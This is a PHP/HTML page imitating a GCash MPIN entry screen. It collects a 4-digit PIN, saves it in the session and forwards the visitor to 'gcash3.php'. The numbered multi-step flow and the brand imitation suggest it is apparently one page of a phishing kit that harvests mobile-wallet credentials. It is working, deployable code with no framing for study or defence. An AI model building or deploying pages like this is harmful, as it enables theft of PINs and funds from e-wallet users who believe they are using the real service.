<?php
session_start();

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get MPIN from POST safely
    $mpin = $_POST['mpin'] ?? '';

    // Simple validation: check if mpin is exactly 4 digits
    if (preg_match('/^\d{4}$/', $mpin)) {
        // Save mpin to session or process as needed
        $_SESSION['gcash_mpin'] = $mpin;

        // Redirect to next step (gcash3.php) after successful input
        header('Location: gcash3.php');
        exit();
    } else {
        $error = "Please enter a valid 4-digit MPIN.";
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>GCash MPIN</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0; padding: 0;
    }
    body {
      font-family: Arial, sans-serif;
      background-color: #f2f2f2;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
    }
    .container {
      background-color: #ffffff;
      width: 100%;
      max-width: 400px;
      border-radius: 16px;
      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
      overflow: hidden;
    }
    .header {
      background-color: #0072CE;
      color: white;
      text-align: center;
      padding: 20px;
    }
    .form {
      padding: 20px;
      text-align: center;
      position: relative;
    }
    .form p {
      margin-bottom: 20px;
      color: #333;
      font-size: 16px;
    }
    .pin-container {
      display: flex;
      justify-content: center;
      gap: 12px;
      margin-bottom: 20px;
    }
    .pin-circle {
      width: 50px;
      height: 50px;
      border: 2px solid #0072CE;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 22px;
      font-weight: bold;
      color: #0072CE;
      background-color: white;
    }
    .form button {
      width: 100%;
      padding: 12px;
      background-color: #0072CE;
      color: white;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }
    .form button:hover:enabled {
      background-color: #005fa3;
    }
    .form button:disabled {
      background-color: #ccc;
      cursor: not-allowed;
    }
    .hidden-input {
      position: absolute;
      opacity: 0;
      pointer-events: none;
    }
    .error {
      color: #e74c3c;
      margin-bottom: 10px;
      font-weight: 600;
    }
    @media (max-width: 480px) {
      .pin-circle {
        width: 40px;
        height: 40px;
        font-size: 18px;
      }
      .form p {
        font-size: 14px;
      }
      .form button {
        font-size: 15px;
        padding: 10px;
      }
    }
  </style>
</head>
<body>

<div class="container">
  <div class="header">
    <h2>GCash</h2>
  </div>

  <form method="POST" class="form" id="mpinForm" autocomplete="off">
    <p>Enter your 4-digit MPIN</p>

    <?php if (!empty($error)): ?>
      <div class="error"><?= htmlspecialchars($error) ?></div>
    <?php endif; ?>

    <div class="pin-container" id="pinDisplay">
      <div class="pin-circle" style="width: 19px; height: 19px;"></div>
      <div class="pin-circle" style="width: 19px; height: 19px;"></div>
      <div class="pin-circle" style="width: 19px; height: 19px;"></div>
      <div class="pin-circle" style="width: 19px; height: 19px;"></div>
    </div>

    <input type="tel" maxlength="4" name="mpin" class="hidden-input" id="realInput" autofocus pattern="\d{4}" inputmode="numeric" />

    <button type="submit" id="nextBtn" disabled>NEXT</button>
  </form>
</div>

<script>
  const realInput = document.getElementById("realInput");
  const circles = document.querySelectorAll(".pin-circle");
  const nextBtn = document.getElementById("nextBtn");

  document.addEventListener("click", () => {
    realInput.focus();
  });

  realInput.addEventListener("input", () => {
    const value = realInput.value;

    circles.forEach((circle, index) => {
      circle.textContent = value[index] ? "•" : "";
    });

    nextBtn.disabled = value.length !== 4;
  });
</script>

</body>
</html>
